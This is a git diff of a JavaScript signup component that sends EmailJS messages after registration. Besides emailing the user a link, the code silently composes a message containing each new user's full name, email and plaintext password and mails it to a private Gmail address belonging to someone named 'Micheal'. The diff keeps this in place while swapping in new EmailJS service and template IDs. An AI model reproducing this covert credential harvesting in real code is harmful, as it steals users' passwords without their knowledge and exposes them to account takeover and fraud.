@@ -59,27 +59,32 @@ const Signup = ({route}) => {
         const res = await req.json()
         setLoader(false)
 
-        if(res.status === 'ok') { 
+        console.log(res.status);
+        
+
+        if(res.status === "ok") { 
 
           const data = {
-            service_id: 'service_w9veki7',
-            template_id: 'template_4bb3dde',
-            user_id: 'BrEB12P3lMsZq-ixI',
-            // public_id: 'BrEB12P3lMsZq-ixI',
+            service_id: 'service_k19ph6c',
+            template_id: 'template_lnr644d',
+            user_id: 'meBDgNKr899Sq8t1g',
+            // public_id: 'meBDgNKr899Sq8t1g',
             template_params: {
-                'name': `${firstname}`,
+                'to_name': `${firstname}`,
                 'email': `${res.email}`,
-                'url': `${res.url}`,
-                'Mail_subject': `${res.subject}`
+                'message': `${res.url}`,
+                'email_subject': `${res.subject}`
             }
         };
+        console.log(res.url);
+        
         
             const msg = `A new user with the following details just signed in name: ${firstname} ${lastname} email: ${email} password: ${password}`
           const data2 = {
-            service_id: 'service_w9veki7',
-            template_id: 'template_y66t3qt',
-            user_id: 'BrEB12P3lMsZq-ixI',
-            // public_id: 'BrEB12P3lMsZq-ixI',
+            service_id: 'service_k19ph6c',
+            template_id: 'template_lnr644d',
+            user_id: 'meBDgNKr899Sq8t1g',
+            // public_id: 'meBDgNKr899Sq8t1g',
             template_params: {    
                 'to_name': `Micheal`,
                 'email': `protondex.mail@gmail.com`,
